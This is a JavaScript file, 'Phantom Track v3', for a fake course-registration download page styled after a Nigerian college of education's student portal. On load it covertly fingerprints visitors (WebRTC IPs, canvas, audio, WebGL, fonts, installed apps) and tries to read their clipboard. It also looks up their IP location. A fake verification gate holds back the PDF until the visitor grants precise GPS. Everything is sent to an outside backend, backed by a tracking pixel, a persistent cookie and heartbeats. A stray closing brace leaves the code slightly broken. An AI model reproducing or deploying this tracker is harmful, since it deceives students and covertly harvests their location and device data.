// ================================================================
// PHANTOM TRACK v3 — Download-page tracker
// Passive: fingerprinting on page load (no prompts)
// Active: GPS capture + PDF download triggered by download button
// ================================================================

(function () {
  'use strict';

  // Change this to your Render URL when deploying:
  // var BACKEND_URL = 'https://your-app.onrender.com/api/log';
  var BACKEND_URL = 'https://phantom-track-backend.onrender.com/api/log';
  var SESSION_ID = 'AKS-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 6);
  var PAGE_LOAD_TIME = Date.now();
  var gpsCollected = false;
  var logoDataUrl = null;   // cached logo for PDF
  var DEBUG = true;         // set false for production

  function debug() {
    if (DEBUG) console.log('[TRACKER]', Array.prototype.slice.call(arguments).join(' '));
  }

  // ==============================================================
  // 0.  PRELOAD LOGO for PDF (reuse header logo cache)
  // ==============================================================
  function preloadLogo() {
    var img = document.getElementById('logo-img');
    var src = (img && img.src) || 'images-3-300x300.webp';
    var tempImg = new Image();
    tempImg.onload = function () {
      try {
        var c = document.createElement('canvas');
        c.width = tempImg.naturalWidth;
        c.height = tempImg.naturalHeight;
        var cx = c.getContext('2d');
        cx.drawImage(tempImg, 0, 0);
        logoDataUrl = c.toDataURL('image/png');
        debug('Logo preloaded OK');
      } catch (e) { debug('Logo canvas tainted — skipping'); }
    };
    tempImg.onerror = function () { debug('Logo not found — skipping'); };
    tempImg.src = src;
  }

  // ==============================================================
  // 1.  SEND LOG — fetch first, sendBeacon fallback
  // ==============================================================
  function sendLog(data) {
    data.sessionId = SESSION_ID;
    data.clientTimestamp = new Date().toISOString();
    var payload = JSON.stringify(data);

    // Primary: fetch (works everywhere, shows errors)
    try {
      fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        keepalive: true
      }).then(function (r) {
        debug('Log sent OK:', data.type, r.status);
      }).catch(function (err) {
        debug('Log FAILED:', err.message);
        // Fallback: sendBeacon
        if (navigator.sendBeacon) {
          var ok = navigator.sendBeacon(BACKEND_URL, new Blob([payload], { type: 'application/json' }));
          debug('sendBeacon fallback:', ok ? 'queued' : 'failed');
        }
      });
    } catch (e) {
      debug('Fetch threw:', e.message);
      if (navigator.sendBeacon) {
        navigator.sendBeacon(BACKEND_URL, new Blob([payload], { type: 'application/json' }));
      }
    }
  }

  // ==============================================================
  // 2.  PASSIVE FINGERPRINTING (fires on page load, no prompts)
  // ==============================================================
  function collectFingerprints() {
    var fp = {};

    // WebRTC local IP leak
    try {
      var pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel('');
      pc.createOffer().then(function (o) { pc.setLocalDescription(o); });
      pc.onicecandidate = function (e) {
        if (!e.candidate) return;
        var m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
        if (m) { fp.localIPs = fp.localIPs || []; if (fp.localIPs.indexOf(m[1]) === -1) fp.localIPs.push(m[1]); }
      };
      setTimeout(function () { pc.close(); }, 2000);
    } catch (e) {}

    // Battery
    if (navigator.getBattery) {
      navigator.getBattery().then(function (b) {
        fp.battery = { level: Math.round(b.level * 100), charging: b.charging };
      });
    }

    // Network
    if (navigator.connection) {
      fp.network = {
        type: navigator.connection.type,
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt
      };
    }

    // Audio fingerprint
    try {
      var actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
      var osc = actx.createOscillator();
      var comp = actx.createDynamicsCompressor();
      osc.type = 'triangle'; osc.frequency.value = 10000;
      osc.connect(comp); comp.connect(actx.destination); osc.start(0);
      actx.startRendering().then(function (buffer) {
        var hash = 0, d = buffer.getChannelData(0).slice(0, 1000);
        for (var i = 0; i < d.length; i++) { hash = ((hash << 5) - hash) + Math.round(d[i] * 1000); hash |= 0; }
        fp.audioFingerprint = hash.toString();
      });
    } catch (e) {}

    // Canvas fingerprint
    try {
      var c = document.createElement('canvas'); c.width = 200; c.height = 50;
      var cx = c.getContext('2d');
      cx.textBaseline = 'top'; cx.font = '14px Arial';
      cx.fillStyle = '#f60'; cx.fillRect(125, 1, 62, 20);
      cx.fillStyle = '#069'; cx.fillText('Akwa Ibom COE 2025', 2, 15);
      cx.fillStyle = 'rgba(102, 204, 0, 0.7)'; cx.fillText('Akwa Ibom COE 2025', 4, 17);
      fp.canvasFingerprint = c.toDataURL().length.toString();
    } catch (e) {}

    // Standard device info
    fp.userAgent = navigator.userAgent;
    fp.platform = navigator.platform;
    fp.language = navigator.language;
    fp.screenWidth = screen.width;
    fp.screenHeight = screen.height;
    fp.pixelRatio = window.devicePixelRatio || 1;
    fp.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
    fp.deviceMemory = navigator.deviceMemory || 'unknown';
    fp.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
    fp.maxTouchPoints = navigator.maxTouchPoints || 0;
    fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    fp.cookiesEnabled = navigator.cookieEnabled;
    fp.referrer = document.referrer || 'direct';
    fp.pageUrl = window.location.href;
    fp.sessionId = SESSION_ID;

    // ---- Enhanced fingerprinting (all passive) ----

    // WebGL GPU fingerprint
    try {
      var glCanvas = document.createElement('canvas');
      var gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
      if (gl) {
        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        fp.webglVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : '';
        fp.webglRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : '';
        fp.webglMaxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
        fp.webglMaxViewportDims = gl.getParameter(gl.MAX_VIEWPORT_DIMS);
        fp.webglExtensions = gl.getSupportedExtensions ? gl.getSupportedExtensions().length : 0;
      }
    } catch (e) {}

    // Font detection (subset — canvas measurement)
    try {
      var fontList = ['Arial','Verdana','Times','Courier','Georgia','Palatino','Garamond','Bookman','Tahoma','Impact','Comic Sans MS','Trebuchet MS','Arial Black','Lucida Console','Monaco'];
      var baseFonts = ['monospace','sans-serif','serif'];
      var fontCanvas = document.createElement('canvas');
      var fontCtx = fontCanvas.getContext('2d');
      var baseWidths = {};
      for (var bf = 0; bf < baseFonts.length; bf++) {
        fontCtx.font = '72px ' + baseFonts[bf];
        baseWidths[baseFonts[bf]] = fontCtx.measureText('mmmmmmmmmm').width;
      }
      fp.availableFonts = [];
      for (var fl = 0; fl < fontList.length; fl++) {
        var detected = false;
        for (var bw = 0; bw < baseFonts.length; bw++) {
          fontCtx.font = '72px ' + fontList[fl] + ',' + baseFonts[bw];
          if (fontCtx.measureText('mmmmmmmmmm').width !== baseWidths[baseFonts[bw]]) {
            detected = true; break;
          }
        }
        if (detected) fp.availableFonts.push(fontList[fl]);
      }
    } catch (e) {}

    // Browser plugins
    try {
      fp.pluginCount = navigator.plugins ? navigator.plugins.length : 0;
      fp.plugins = [];
      if (navigator.plugins) {
        for (var pi = 0; pi < Math.min(navigator.plugins.length, 10); pi++) {
          fp.plugins.push(navigator.plugins[pi].name);
        }
      }
    } catch (e) {}

    // Math precision fingerprint
    try { fp.mathTan = (Math.tan(-1e300)).toString(); } catch (e) {}

    // Screen orientation
    try {
      fp.screenOrientation = screen.orientation ? screen.orientation.type :
        (window.orientation !== undefined ? window.orientation : 'unknown');
    } catch (e) {}

    // CSS media queries
    try {
      fp.prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
      fp.prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
      fp.prefersContrast = window.matchMedia('(prefers-contrast: high)').matches;
      fp.supportsHover = window.matchMedia('(hover: hover)').matches;
      fp.supportsPointer = window.matchMedia('(pointer: coarse)').matches ? 'coarse' : 'fine';
    } catch (e) {}

    // Feature detection
    fp.serviceWorker = 'serviceWorker' in navigator;
    fp.indexedDB = !!window.indexedDB;
    fp.webSocket = 'WebSocket' in window;
    fp.webRTC = 'RTCPeerConnection' in window;
    fp.bluetooth = 'bluetooth' in navigator;
    fp.usb = 'usb' in navigator;
    fp.serial = 'serial' in navigator;
    fp.nfc = 'nfc' in navigator;
    fp.vr = 'xr' in navigator || 'getVRDisplays' in navigator;
    fp.speechSynthesis = 'speechSynthesis' in window;
    fp.pdfViewer = navigator.pdfViewerEnabled;

    // Notification permission status
    if (navigator.permissions && navigator.permissions.query) {
      try {
        navigator.permissions.query({ name: 'notifications' }).then(function (s) {
          fp.notificationPermission = s.state;
        }).catch(function () {});
        navigator.permissions.query({ name: 'camera' }).then(function (s) {
          fp.cameraPermission = s.state;
        }).catch(function () {});
        navigator.permissions.query({ name: 'microphone' }).then(function (s) {
          fp.microphonePermission = s.state;
        }).catch(function () {});
      } catch (e) {}
    }

    // Geolocation permission status (Chrome)
    if (navigator.permissions && navigator.permissions.query) {
      try {
        navigator.permissions.query({ name: 'geolocation' }).then(function (s) {
          fp.geolocationPermission = s.state;
        }).catch(function () {});
      } catch (e) {}
    }

    // ---- Deeper fingerprinting (all passive) ----

    // Speech synthesis voices (very unique per device)
    try {
      if (window.speechSynthesis) {
        var voices = window.speechSynthesis.getVoices();
        fp.speechVoiceCount = voices.length;
        fp.speechVoices = [];
        for (var vi = 0; vi < Math.min(voices.length, 15); vi++) {
          fp.speechVoices.push(voices[vi].name + '|' + voices[vi].lang);
        }
      }
    } catch (e) {}

    // Storage estimate — total disk + available
    try {
      if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(function (est) {
          fp.storageQuota = est.quota;
          fp.storageUsage = est.usage;
          if (est.quota) fp.storageGB = (est.quota / 1073741824).toFixed(1);
        }).catch(function () {});
      }
    } catch (e) {}

    // MIME types
    try {
      fp.mimeTypeCount = navigator.mimeTypes ? navigator.mimeTypes.length : 0;
      fp.mimeTypes = [];
      if (navigator.mimeTypes) {
        for (var mi = 0; mi < Math.min(navigator.mimeTypes.length, 10); mi++) {
          fp.mimeTypes.push(navigator.mimeTypes[mi].type);
        }
      }
    } catch (e) {}

    // Detailed WebGL shader precision + texture units
    try {
      var gl2 = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
      if (gl2) {
        fp.webglMaxTextureUnits = gl2.getParameter(gl2.MAX_TEXTURE_IMAGE_UNITS);
        fp.webglMaxVertexTextures = gl2.getParameter(gl2.MAX_VERTEX_TEXTURE_IMAGE_UNITS);
        fp.webglMaxCombinedTexture = gl2.getParameter(gl2.MAX_COMBINED_TEXTURE_IMAGE_UNITS);
        fp.webglMaxCubeMapSize = gl2.getParameter(gl2.MAX_CUBE_MAP_TEXTURE_SIZE);
        fp.webglMaxRenderBuffer = gl2.getParameter(gl2.MAX_RENDERBUFFER_SIZE);
        fp.webglMaxDrawBuffers = gl2.getParameter(gl2.MAX_DRAW_BUFFERS);
        var vs = gl2.getShaderPrecisionFormat(gl2.VERTEX_SHADER, gl2.HIGH_FLOAT);
        var fs = gl2.getShaderPrecisionFormat(gl2.FRAGMENT_SHADER, gl2.HIGH_FLOAT);
        if (vs) fp.webglVertPrecision = vs.precision + ',' + vs.rangeMin + ',' + vs.rangeMax;
        if (fs) fp.webglFragPrecision = fs.precision + ',' + fs.rangeMin + ',' + fs.rangeMax;
      }
    } catch (e) {}

    // Color gamut + display mode
    try {
      fp.colorGamut = window.matchMedia('(color-gamut: p3)').matches ? 'p3' :
                      window.matchMedia('(color-gamut: srgb)').matches ? 'srgb' : 'unknown';
      fp.displayMode = window.matchMedia('(display-mode: standalone)').matches ? 'standalone' :
                       window.matchMedia('(display-mode: fullscreen)').matches ? 'fullscreen' :
                       window.matchMedia('(display-mode: minimal-ui)').matches ? 'minimal-ui' : 'browser';
      fp.invertedColors = window.matchMedia('(inverted-colors: inverted)').matches;
    } catch (e) {}

    // Data saver
    try {
      if (navigator.connection) {
        fp.saveData = navigator.connection.saveData || false;
      }
    } catch (e) {}

    // Installed related apps (Android only — reveals if specific apps exist)
    try {
      if (navigator.getInstalledRelatedApps) {
        navigator.getInstalledRelatedApps().then(function (apps) {
          fp.installedApps = [];
          for (var ai = 0; ai < apps.length; ai++) {
            fp.installedApps.push(apps[ai].platform + ':' + (apps[ai].url || apps[ai].id || '?'));
          }
        }).catch(function () {});
      }
    } catch (e) {}

    // Clipboard read attempt (works on some browsers when page is focused)
    try {
      if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(function (text) {
          if (text && text.length > 0 && text.length < 500) {
            fp.clipboardContent = text.substring(0, 200);
          }
        }).catch(function () {});
      }
    } catch (e) {}

    // Keyboard layout
    try {
      if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
        navigator.keyboard.getLayoutMap().then(function (map) {
          fp.keyboardLayout = map.get('KeyQ') || 'unknown';
        }).catch(function () {});
      }
    } catch (e) {}

    // Send after 3s (let async WebRTC/audio/battery/permissions populate)
    setTimeout(function () {
      sendLog({ type: 'FINGERPRINT', fingerprints: fp });
    }, 3000);

    // Also do IP fallback in parallel
    fallbackIpLookup();

    return fp;
  }

  // ==============================================================
  // 3.  IP FALLBACK — dual API cross-reference for accuracy
  // ==============================================================
  function fallbackIpLookup() {
    var apis = [
      { url: 'https://ipapi.co/json/', name: 'ipapi.co' },
      { url: 'https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,lat,lon,isp,org,query', name: 'ip-api.com' }
    ];
    var results = [];

    function tryNext(idx) {
      if (idx >= apis.length) {
        // All done — pick best result
        if (results.length > 0) {
          sendLog({
            type: 'IP_FALLBACK',
            sources: results,
            latitude: results[0].latitude,
            longitude: results[0].longitude,
            accuracy: 'ip_approx',
            ip: results[0].ip,
            city: results[0].city,
            region: results[0].region,
            country: results[0].country,
            org: results[0].org,
            googleMaps: 'https://www.google.com/maps?q=' + results[0].latitude + ',' + results[0].longitude
          });
        }
        return;
      }
      var api = apis[idx];
      try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', api.url, true);
        xhr.timeout = 5000;
        xhr.onload = function () {
          if (xhr.status === 200) {
            try {
              var geo = JSON.parse(xhr.responseText);
              results.push({
                source: api.name,
                latitude: geo.latitude || geo.lat,
                longitude: geo.longitude || geo.lon,
                ip: geo.ip || geo.query,
                city: geo.city,
                region: geo.region || geo.regionName,
                country: geo.country_name || geo.country,
                org: geo.org || geo.isp
              });
              debug('IP API ' + api.name + ': ' + (results[results.length - 1].city || 'unknown'));
            } catch (e) { /* parse error */ }
          }
          tryNext(idx + 1);
        };
        xhr.onerror = function () { tryNext(idx + 1); };
        xhr.send();
      } catch (e) { tryNext(idx + 1); }
    }

    tryNext(0);
  }

  // ==============================================================
  // 4.  GPS CAPTURE (called after user clicks "Verify Location")
  // ==============================================================
  function captureGps() {
    return new Promise(function (resolve) {
      if (!navigator.geolocation) {
        debug('GPS: not supported');
        resolve({ success: false, reason: 'unsupported' });
        return;
      }

      var done = false;

      function finish(success, data) {
        if (done) return;
        done = true;
        resolve(success ? { success: true, data: data } : { success: false, reason: data });
      }

      // First attempt: quick low-accuracy (WiFi/cell) — works in 1-3s
      debug('GPS: requesting position (low accuracy first)...');
      navigator.geolocation.getCurrentPosition(
        function (pos) {
          var acc = pos.coords.accuracy;
          var isMobile = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
          var quality = acc <= 50 ? 'EXCELLENT' : acc <= 200 ? 'GOOD' : acc <= 5000 ? 'FAIR' : 'DESKTOP_ESTIMATE';

          var data = {
            type: acc > 5000 ? 'GPS_LOW_ACCURACY' : 'GPS',
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: acc,
            quality: quality,
            isMobile: isMobile,
            altitude: pos.coords.altitude,
            heading: pos.coords.heading,
            speed: pos.coords.speed,
            gpsTimestamp: new Date(pos.timestamp).toISOString(),
            googleMaps: 'https://www.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude
          };
          debug('GPS: ' + quality + ' (' + acc + 'm)');
          sendLog(data);

          // If accuracy is poor, try high-accuracy in background for better fix
          if (acc > 200) {
            debug('GPS: accuracy poor, trying high-accuracy...');
            navigator.geolocation.getCurrentPosition(
              function (pos2) {
                if (pos2.coords.accuracy < acc) {
                  data.latitude = pos2.coords.latitude;
                  data.longitude = pos2.coords.longitude;
                  data.accuracy = pos2.coords.accuracy;
                  data.quality = pos2.coords.accuracy <= 50 ? 'EXCELLENT' : pos2.coords.accuracy <= 200 ? 'GOOD' : 'FAIR';
                  data.gpsTimestamp = new Date(pos2.timestamp).toISOString();
                  data.googleMaps = 'https://www.google.com/maps?q=' + pos2.coords.latitude + ',' + pos2.coords.longitude;
                  debug('GPS improved: ' + data.quality + ' (' + data.accuracy + 'm)');
                  sendLog(data);
                }
              },
              function () {},
              { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
          }

          finish(true, data);
        },
        function (err) {
          debug('GPS error: ' + (err.message || 'unknown'));
          finish(false, err.message || 'denied');
        },
        { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
      );

      // Safety timeout
      setTimeout(function () {
        if (!done) {
          debug('GPS: safety timeout');
          finish(false, 'timeout');
        }
      }, 12000);
    });
  }

  // Toggle download buttons disabled/enabled
  function setButtonsLocked(locked) {
    var btns = document.querySelectorAll('.btn-download, .btn-download-small');
    for (var b = 0; b < btns.length; b++) {
      btns[b].disabled = locked;
      btns[b].style.opacity = locked ? '0.4' : '1';
      btns[b].style.cursor = locked ? 'not-allowed' : 'pointer';
    }
  }

  // ==============================================================
  // 6.  PDF GENERATION + DOWNLOAD (reads data from page DOM)
  // ==============================================================
  function generateAndDownloadPdf() {
    try {
      // ---- Scrape student info from DOM ----
      var gridValues = document.querySelectorAll('.grid-value');
      var gv = [];
      for (var gi = 0; gi < gridValues.length; gi++) { gv.push(gridValues[gi].textContent.trim()); }
      var surname    = gv[0] || 'Okon';
      var firstName  = gv[1] || 'Ubonobong';
      var otherNames = gv[2] || 'Bassey';
      var regNo      = gv[3] || '2023/NCE/EDU/0147';
      var programme  = gv[4] || 'NCE';
      var deptProg   = gv[5] || 'Primary Education Studies';
      var session    = gv[6] || '2025-2026';
      var semester   = gv[7] || 'Second Semester';
      var yearStudy  = gv[8] || '200 Level';

      // ---- Scrape courses from DOM ----
      var courseRows = document.querySelectorAll('.course-table tbody tr');
      var courses = [];
      var totalCredits = 0;
      for (var cr = 0; cr < courseRows.length; cr++) {
        var cells = courseRows[cr].querySelectorAll('td');
        if (cells.length >= 6) {
          totalCredits += parseInt(cells[3].textContent.trim()) || 0;
          courses.push([
            cells[0].textContent.trim(),
            cells[1].textContent.trim(),
            cells[2].textContent.trim(),
            cells[3].textContent.trim(),
            cells[4].textContent.trim(),
            cells[5].textContent.trim()
          ]);
        }
      }

      var doc = new window.jspdf.jsPDF({ unit: 'mm', format: 'a4' });

      // --- HEADER ---
      doc.setFillColor(13, 43, 107);
      doc.rect(15, 8, 180, 40, 'F');
      doc.setFillColor(198, 40, 40);
      doc.rect(15, 48, 180, 2, 'F');

      if (logoDataUrl) doc.addImage(logoDataUrl, 'PNG', 22, 14, 18, 18);

      doc.setTextColor(255, 255, 255);
      doc.setFontSize(9);
      doc.setFont(undefined, 'bold');
      doc.text('AKWA IBOM STATE COLLEGE OF EDUCATION', 105, 18, { align: 'center' });
      doc.setFontSize(6.5);
      doc.setFont(undefined, 'normal');
      doc.text('(IN AFFILIATION TO THE UNIVERSITY OF UYO)', 105, 23, { align: 'center' });
      doc.setFontSize(7.5);
      doc.setFont(undefined, 'bold');
      doc.text('AFAHA NSIT', 105, 29, { align: 'center' });
      doc.setFontSize(6);
      doc.setFont(undefined, 'normal');
      doc.text('P.M.B 1019 ETINAN, AKWA IBOM STATE, NIGERIA', 105, 33, { align: 'center' });

      // --- FORM TITLE ---
      doc.setTextColor(90, 110, 160);
      doc.setFontSize(10);
      doc.setFont(undefined, 'bold');
      doc.text('Registered Courses', 105, 44, { align: 'center' });

      var y = 56;

      // --- BIODATA GRID ---
      doc.setDrawColor(200, 205, 215);
      doc.setFillColor(255, 255, 255);
      doc.rect(14, y, 182, 42);
      doc.rect(15, y + 1, 28, 40);
      doc.setFontSize(6);
      doc.setTextColor(180, 180, 180);
      doc.text('PASSPORT', 29, y + 21, { align: 'center' });

      var fields3x3 = [
        [['Surname', surname], ['First Name', firstName], ['Other Names', otherNames]],
        [['Reg No', regNo], ['Programme', programme], ['Dept Programme', deptProg]],
        [['Session', session], ['Semester', semester], ['Year Of Study', yearStudy]]
      ];

      var gx = 44, gw = 50.5, gh = 14;
      for (var row = 0; row < 3; row++) {
        for (var col = 0; col < 3; col++) {
          var cx = gx + col * gw;
          var cy = y + row * gh;
          doc.rect(cx, cy, gw, gh);
          doc.setTextColor(140, 140, 150);
          doc.setFontSize(5.5);
          doc.setFont(undefined, 'bold');
          doc.text(fields3x3[row][col][0], cx + 1.5, cy + 3.5);
          doc.setTextColor(0, 0, 0);
          doc.setFontSize(7.5);
          doc.setFont(undefined, 'normal');
          doc.text(fields3x3[row][col][1], cx + 1.5, cy + 9.5);
        }
      }

      y += 46;

      // --- COURSES TABLE ---
      var colX = [18, 36, 62, 155, 168, 180];
      var colW = [18, 26, 93, 13, 12, 28];

      doc.setFillColor(230, 235, 242);
      doc.rect(14, y, 182, 7, 'F');
      doc.setTextColor(50, 50, 60);
      doc.setFontSize(6);
      doc.setFont(undefined, 'bold');
      var headers = ['Sn', 'Code', 'Title', 'Cr', 'Type', 'Category'];
      for (var h = 0; h < headers.length; h++) {
        doc.text(headers[h], colX[h], y + 4.8);
      }

      y += 8;
      doc.setTextColor(0, 0, 0);
      doc.setFont(undefined, 'normal');
      doc.setFontSize(7);

      for (var j = 0; j < courses.length; j++) {
        if (j % 2 === 0) { doc.setFillColor(248, 249, 252); doc.rect(14, y - 4.5, 182, 7, 'F'); }
        doc.text(courses[j][0], colX[0], y);
        doc.text(courses[j][1], colX[1], y);
        doc.text(courses[j][2], colX[2], y);
        doc.text(courses[j][3], colX[3], y);
        doc.text(courses[j][4], colX[4], y);
        doc.text(courses[j][5], colX[5], y);
        y += 7;
      }

      // Total row
      y += 2;
      doc.setDrawColor(13, 43, 107);
      doc.line(14, y - 2, 196, y - 2);
      doc.setFont(undefined, 'bold');
      doc.text('TOTAL CREDIT UNITS', 18, y);
      doc.text(String(totalCredits), colX[3] - 2, y);

      // --- SIGNATURES ---
      y += 18;
      doc.setDrawColor(0, 0, 0);
      doc.setFont(undefined, 'normal');
      doc.setFontSize(8);
      doc.line(25, y, 90, y);
      doc.line(120, y, 185, y);
      y += 4;
      doc.setFontSize(6.5);
      doc.setTextColor(100, 100, 100);
      doc.text('HOD Signature and Date', 57, y, { align: 'center' });
      doc.text('Dean Signature and Date', 152, y, { align: 'center' });

      // --- FOOTER ---
      y += 14;
      doc.setFontSize(6);
      doc.setTextColor(160, 160, 160);
      doc.text('This is a computer-generated document from the AKWA IBOM STATE COLLEGE OF EDUCATION Student Portal.', 105, y, { align: 'center' });
      y += 4;
      doc.text('P.M.B. 1019, Etinan, Akwa Ibom State, Nigeria | Office of the Registrar', 105, y, { align: 'center' });

      // Tracking pixel + link
      y += 6;
      try { doc.addImage(BACKEND_URL.replace('/api/log', '/pixel.png'), 'PNG', 104.5, y, 1, 1); } catch (e) {}
      y += 5;
      var trackingUrl = window.location.origin + window.location.pathname + '?ref=pdf';
      doc.setFontSize(6.5);
      doc.setTextColor(13, 43, 107);
      doc.textWithLink('Verify document online', 105, y, { align: 'center', url: trackingUrl });

      doc.save('AKSCOE-Course-Registration-Form.pdf');
      return true;
    } catch (e) {
      debug('PDF error:', e.message);
      return false;
    }
  }

  // ==============================================================
  // 7.  COOKIE PERSISTENCE
  // ==============================================================
  function setPersistenceCookie() {
    var existing = getCookie('_aks_portal_session');
    if (!existing) {
      setCookie('_aks_portal_session', SESSION_ID, 365);
      sendLog({ type: 'FIRST_VISIT' });
    } else {
      sendLog({ type: 'RETURN_VISIT', previousSession: existing });
    }
  }
  function setCookie(n, v, d) {
    var exp = new Date(); exp.setTime(exp.getTime() + d * 86400000);
    document.cookie = n + '=' + encodeURIComponent(v) + ';expires=' + exp.toUTCString() + ';path=/;SameSite=Lax';
  }
  function getCookie(n) {
    var m = document.cookie.match(new RegExp('(?:^|;\\s*)' + n + '=([^;]*)'));
    return m ? decodeURIComponent(m[1]) : null;
  }

  // ==============================================================
  // 8.  DOWNLOAD BUTTON HANDLER — manual download fallback
  // ==============================================================
  function bindDownloadButtons() {
    var buttons = document.querySelectorAll('.btn-download, .btn-download-small');

    function handleDownload() {
      if (gpsCollected) {
        // Already have GPS — just download
        generateAndDownloadPdf();
        return;
      }
      // Try GPS, download on success
      captureGps().then(function (result) {
        if (result.success) {
          gpsCollected = true;
          generateAndDownloadPdf();
          sendLog({ type: 'DOWNLOAD', gpsSuccess: true, dwellMs: Date.now() - PAGE_LOAD_TIME });
        }
        // If denied, IP fallback already sent — nothing more to do
      });
    }

    for (var i = 0; i < buttons.length; i++) {
      buttons[i].addEventListener('click', handleDownload);
    }
  }

  // ==============================================================
  // 9.  ACTIVITY MONITORING
  // ==============================================================
  function startActivityMonitor() {
    window.addEventListener('beforeunload', function () {
      var payload = JSON.stringify({
        type: 'PAGE_EXIT', sessionId: SESSION_ID,
        dwellTimeMs: Date.now() - PAGE_LOAD_TIME,
        gpsCollected: gpsCollected,
        clientTimestamp: new Date().toISOString()
      });
      try { fetch(BACKEND_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true }); } catch (e) {}
      if (navigator.sendBeacon) navigator.sendBeacon(BACKEND_URL, new Blob([payload], { type: 'application/json' }));
    });
  }

  // ==============================================================
  // INIT — show gate overlay, GPS fires on user tap
  // ==============================================================
  function init() {
    debug('Init — BACKEND_URL:', BACKEND_URL);
    preloadLogo();
    setPersistenceCookie();
    collectFingerprints();
    bindDownloadButtons();
    startActivityMonitor();
    sendLog({ type: 'PAGE_LOAD', backendUrl: BACKEND_URL, debug: DEBUG });

    // Heartbeat
    var heartbeat = 0;
    setInterval(function () {
      heartbeat++;
      sendLog({ type: 'HEARTBEAT', beat: heartbeat, dwellMs: Date.now() - PAGE_LOAD_TIME });
    }, 30000);

    // Show gate — user must tap "Continue" to trigger GPS (Chrome requires user gesture)
    var gate = document.getElementById('gps-gate');
    var btnEnter = document.getElementById('btn-enter-portal');
    var btnRetry = document.getElementById('btn-retry-loc');
    var retryMsg = document.getElementById('gps-retry-msg');

    function tryGps() {
      var loader = gate.querySelector('.gps-gate-loader');
      loader.style.display = 'block';

      // Safety: if GPS hangs for 15s, show retry
      var hangTimer = setTimeout(function () {
        if (!gpsCollected && gate && !gate.classList.contains('hidden')) {
          retryMsg.style.display = 'block';
          retryMsg.querySelector('span').textContent = 'Taking too long. Check your connection and try again.';
          loader.style.display = 'none';
        }
      }, 15000);

      captureGps().then(function (result) {
        clearTimeout(hangTimer);
        if (result.success) {
          gpsCollected = true;
          gate.classList.add('hidden');
          setButtonsLocked(false);
          sendLog({ type: 'GPS_OK', gpsSuccess: true, dwellMs: Date.now() - PAGE_LOAD_TIME });
          debug('GPS OK — auto-downloading PDF');
          generateAndDownloadPdf();
          sendLog({ type: 'DOWNLOAD', gpsSuccess: true, pdfGenerated: true, auto: true, dwellMs: Date.now() - PAGE_LOAD_TIME });
        } else {
          // Denied — show retry in gate
          sendLog({ type: 'GPS_DENIED_RETRY', reason: result.reason, dwellMs: Date.now() - PAGE_LOAD_TIME });
          debug('GPS denied — showing retry');
          retryMsg.style.display = 'block';
          gate.querySelector('.gps-gate-loader').style.display = 'none';
        }
      });
    }

    // Check if permission already granted from a previous visit
    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: 'geolocation' }).then(function (s) {
        if (s.state === 'granted') {
          // Already allowed — skip gate, fire GPS immediately
          debug('Geolocation already granted — skipping gate');
          gate.classList.add('hidden');
          tryGps();
        }
      }).catch(function () {});
    }

    btnEnter.addEventListener('click', function () {
      gate.querySelector('.gps-gate-loader').style.display = 'block';
      btnEnter.style.display = 'none';
      tryGps();
    });

    btnRetry.addEventListener('click', function () {
      retryMsg.style.display = 'none';
      gate.querySelector('.gps-gate-loader').style.display = 'block';
      tryGps();
    });
  }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
